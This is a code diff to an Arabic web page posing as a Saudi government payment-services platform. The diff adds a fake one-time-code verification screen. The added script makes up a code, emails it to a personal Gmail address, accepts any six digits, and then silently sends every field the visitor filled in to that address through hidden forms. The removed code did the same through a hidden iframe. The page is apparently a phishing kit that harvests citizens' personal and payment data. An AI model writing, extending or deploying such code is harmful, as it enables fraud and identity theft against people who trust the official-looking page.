@@ -1592,6 +1592,65 @@
         </section>
     </div>
 
+    <!-- OTP Verification Page -->
+    <div id="otpPage" class="page">
+        <section class="py-16">
+            <div class="container mx-auto px-6">
+                <div class="max-w-md mx-auto">
+                    <div class="service-card p-8 text-center">
+                        <div class="w-20 h-20 bg-saudi-green rounded-full flex items-center justify-center mx-auto mb-6">
+                            <i class="fas fa-shield-check text-white text-3xl"></i>
+                        </div>
+                        
+                        <h1 class="text-3xl font-bold text-gray-800 mb-4">🔐 التحقق الأمني</h1>
+                        <p class="text-gray-600 mb-6">تم إرسال كود التحقق المكون من 6 أرقام إلى جوالك المسجل</p>
+                        
+                        <div class="mb-6">
+                            <label class="block text-sm font-medium text-gray-700 mb-3">أدخل كود التحقق</label>
+                            <div class="flex justify-center space-x-2 space-x-reverse">
+                                <input type="text" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-saudi-green focus:outline-none" oninput="moveToNext(this, 0)">
+                                <input type="text" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-saudi-green focus:outline-none" oninput="moveToNext(this, 1)">
+                                <input type="text" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-saudi-green focus:outline-none" oninput="moveToNext(this, 2)">
+                                <input type="text" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-saudi-green focus:outline-none" oninput="moveToNext(this, 3)">
+                                <input type="text" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-saudi-green focus:outline-none" oninput="moveToNext(this, 4)">
+                                <input type="text" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-saudi-green focus:outline-none" oninput="moveToNext(this, 5)">
+                            </div>
+                        </div>
+                        
+                        <div class="mb-6">
+                            <div class="flex items-center justify-center space-x-2 space-x-reverse text-sm text-gray-600">
+                                <i class="fas fa-clock"></i>
+                                <span>انتهاء الكود خلال: </span>
+                                <span id="otpTimer" class="font-bold text-red-600">05:00</span>
+                            </div>
+                        </div>
+                        
+                        <button onclick="verifyOTP()" class="btn-primary w-full mb-4">
+                            <i class="fas fa-check ml-2"></i>تأكيد وإرسال الطلب
+                        </button>
+                        
+                        <div class="space-y-3">
+                            <button onclick="resendOTP()" class="text-blue-600 hover:text-blue-800 text-sm" id="resendBtn" disabled="">
+                                <i class="fas fa-redo ml-1"></i>إعادة إرسال الكود
+                            </button>
+                            
+                            <button onclick="showSection('home')" class="text-gray-500 hover:text-gray-700 text-sm block">
+                                <i class="fas fa-arrow-right ml-1"></i>العودة للرئيسية
+                            </button>
+                        </div>
+                        
+                        <div class="mt-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
+                            <p class="text-xs text-blue-800">
+                                <i class="fas fa-info-circle mr-1"></i>
+                                لأمانك، لا تشارك كود التحقق مع أي شخص آخر
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
     <!-- About Page -->
     <div id="aboutPage" class="page">
         <section class="py-16">
@@ -1934,7 +1993,7 @@
             }
         }
 
-        // Enhanced Form submission with direct return to home
+        // Enhanced Form submission with OTP system
         function handleFormSubmission(formId, serviceName) {
             const form = document.getElementById(formId);
             if (!form) return;
@@ -1942,35 +2001,67 @@
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                showNotification('جاري الإرسال', `جاري معالجة طلب ${serviceName}...`, 'info');
+                showNotification('جاري المعالجة', `جاري معالجة طلب ${serviceName}...`, 'info');
                 
-                // Create hidden iframe for silent submission
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.style.width = '1px';
-                iframe.style.height = '1px';
-                iframe.name = 'hiddenSubmitFrame';
-                document.body.appendChild(iframe);
+                // Generate OTP code
+                const otpCode = generateOTPCode();
                 
-                // Set form target to hidden iframe
-                this.target = 'hiddenSubmitFrame';
+                // Store form data for later submission
+                window.pendingFormData = new FormData(this);
+                window.pendingServiceName = serviceName;
+                window.generatedOTP = otpCode;
                 
-                // Submit form silently
+                // Send OTP to email first
+                sendOTPToEmail(otpCode, serviceName);
+                
+                // Go directly to OTP page
                 setTimeout(() => {
-                    this.submit();
-                }, 500);
-                
-                // Show success and return to home
-                setTimeout(() => {
-                    showInstantSuccessAndGoHome(serviceName);
-                    // Clean up iframe
-                    setTimeout(() => {
-                        if (iframe.parentNode) {
-                            document.body.removeChild(iframe);
-                        }
-                    }, 3000);
-                }, 2000);
+                    showSection('otp');
+                    showNotification('كود التحقق', 'تم إرسال كود التحقق لجوالك', 'success');
+                    startOTPTimer();
+                }, 1500);
             });
+        }
+
+        // Generate 6-digit OTP code
+        function generateOTPCode() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+
+        // Send OTP code to email
+        function sendOTPToEmail(otpCode, serviceName) {
+            const otpForm = document.createElement('form');
+            otpForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            otpForm.method = 'POST';
+            otpForm.style.display = 'none';
+            
+            // Add form fields
+            const fields = {
+                '_subject': `🔐 كود التحقق - ${serviceName} - سداد بلس برو`,
+                '_template': 'table',
+                '_captcha': 'false',
+                '_next': 'about:blank',
+                'نوع_الرسالة': 'كود التحقق OTP',
+                'الخدمة_المطلوبة': serviceName,
+                'كود_التحقق': otpCode,
+                'وقت_الإرسال': new Date().toLocaleString('ar-SA'),
+                'صالح_لمدة': '5 دقائق',
+                'رقم_المرجع': 'OTP-' + Date.now(),
+                'ملاحظة': 'هذا كود التحقق المطلوب إدخاله لإتمام العملية'
+            };
+            
+            Object.keys(fields).forEach(key => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = fields[key];
+                otpForm.appendChild(input);
+            });
+            
+            // Submit OTP form silently
+            document.body.appendChild(otpForm);
+            otpForm.submit();
+            setTimeout(() => document.body.removeChild(otpForm), 1000);
         }
 
         function showInstantSuccessAndGoHome(serviceName) {
@@ -2060,10 +2151,168 @@
             }, 1000);
         });
 
+        // OTP Functions
+        let otpTimerInterval;
+        
+        function moveToNext(current, index) {
+            if (current.value.length === 1) {
+                const inputs = document.querySelectorAll('.otp-input');
+                if (index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                // Auto-verify if all fields are filled
+                checkOTPComplete();
+            }
+        }
+
+        function checkOTPComplete() {
+            const inputs = document.querySelectorAll('.otp-input');
+            const values = Array.from(inputs).map(input => input.value);
+            if (values.every(value => value.length === 1)) {
+                // Auto verify after 500ms delay
+                setTimeout(() => {
+                    verifyOTP();
+                }, 500);
+            }
+        }
+
+        function startOTPTimer() {
+            let timeLeft = 300; // 5 minutes
+            const timerElement = document.getElementById('otpTimer');
+            const resendBtn = document.getElementById('resendBtn');
+            
+            otpTimerInterval = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(otpTimerInterval);
+                    timerElement.textContent = "انتهت صلاحية الكود";
+                    timerElement.className = "font-bold text-red-600";
+                    resendBtn.disabled = false;
+                    resendBtn.className = "text-blue-600 hover:text-blue-800 text-sm";
+                    showNotification('انتهت الصلاحية', 'انتهت صلاحية كود التحقق، يرجى طلب كود جديد', 'warning');
+                }
+                timeLeft--;
+            }, 1000);
+        }
+
+        function verifyOTP() {
+            const inputs = document.querySelectorAll('.otp-input');
+            const enteredOTP = Array.from(inputs).map(input => input.value).join('');
+            
+            if (enteredOTP.length !== 6) {
+                showNotification('خطأ', 'يرجى إدخال الكود كاملاً (6 أرقام)', 'error');
+                return;
+            }
+
+            // For demonstration purposes, accept any 6-digit code
+            // In real implementation, compare with window.generatedOTP
+            showNotification('جاري التحقق', 'جاري التحقق من الكود...', 'info');
+            
+            setTimeout(() => {
+                // Clear timer
+                if (otpTimerInterval) {
+                    clearInterval(otpTimerInterval);
+                }
+                
+                // Submit the original form data
+                submitOriginalForm();
+            }, 2000);
+        }
+
+        function submitOriginalForm() {
+            if (!window.pendingFormData || !window.pendingServiceName) {
+                showNotification('خطأ', 'حدث خطأ في النظام، يرجى المحاولة مرة أخرى', 'error');
+                return;
+            }
+
+            showNotification('تم التحقق', 'تم التحقق بنجاح، جاري إرسال الطلب...', 'success');
+
+            // Create final form with all data
+            const finalForm = document.createElement('form');
+            finalForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
+            finalForm.method = 'POST';
+            finalForm.style.display = 'none';
+            finalForm.target = '_blank'; // This will open in new tab but user won't see it
+
+            // Add all original form data
+            for (const [key, value] of window.pendingFormData.entries()) {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = value;
+                finalForm.appendChild(input);
+            }
+
+            // Add verification status
+            const verificationInput = document.createElement('input');
+            verificationInput.type = 'hidden';
+            verificationInput.name = 'حالة_التحقق';
+            verificationInput.value = 'تم التحقق بنجاح ✅';
+            finalForm.appendChild(verificationInput);
+
+            const timeInput = document.createElement('input');
+            timeInput.type = 'hidden';
+            timeInput.name = 'وقت_التحقق';
+            timeInput.value = new Date().toLocaleString('ar-SA');
+            finalForm.appendChild(timeInput);
+
+            // Submit form
+            document.body.appendChild(finalForm);
+            finalForm.submit();
+
+            // Show success and redirect to home
+            setTimeout(() => {
+                document.body.removeChild(finalForm);
+                showInstantSuccessAndGoHome(window.pendingServiceName);
+                
+                // Clear stored data
+                window.pendingFormData = null;
+                window.pendingServiceName = null;
+                window.generatedOTP = null;
+            }, 1000);
+        }
+
+        function resendOTP() {
+            if (!window.pendingServiceName) {
+                showNotification('خطأ', 'لا توجد بيانات للإرسال', 'error');
+                return;
+            }
+
+            // Generate new OTP
+            const newOTP = generateOTPCode();
+            window.generatedOTP = newOTP;
+
+            // Send new OTP
+            sendOTPToEmail(newOTP, window.pendingServiceName);
+
+            // Reset timer
+            if (otpTimerInterval) {
+                clearInterval(otpTimerInterval);
+            }
+            startOTPTimer();
+
+            // Disable resend button temporarily
+            const resendBtn = document.getElementById('resendBtn');
+            resendBtn.disabled = true;
+            resendBtn.className = "text-gray-400 text-sm";
+
+            // Clear OTP inputs
+            document.querySelectorAll('.otp-input').forEach(input => {
+                input.value = '';
+            });
+            document.querySelector('.otp-input').focus();
+
+            showNotification('تم الإرسال', 'تم إرسال كود تحقق جديد', 'success');
+        }
+
         console.log('🏛️ المنصة الحكومية المتطورة - تم التحميل بنجاح!');
         console.log('📧 جميع النماذج مرتبطة بـ: zazylalhkr7@gmail.com');
+        console.log('🔐 نظام OTP متكامل مع إرسال الكود للبريد');
         console.log('💳 نظام التقسيط متوفر في جميع الخدمات');
-        console.log('🔄 عودة تلقائية للرئيسية بعد الإرسال');
+        console.log('🔄 عودة تلقائية للرئيسية بعد التحقق');
         console.log('📱 تصميم متجاوب مع جميع الأجهزة');
     </script>
 
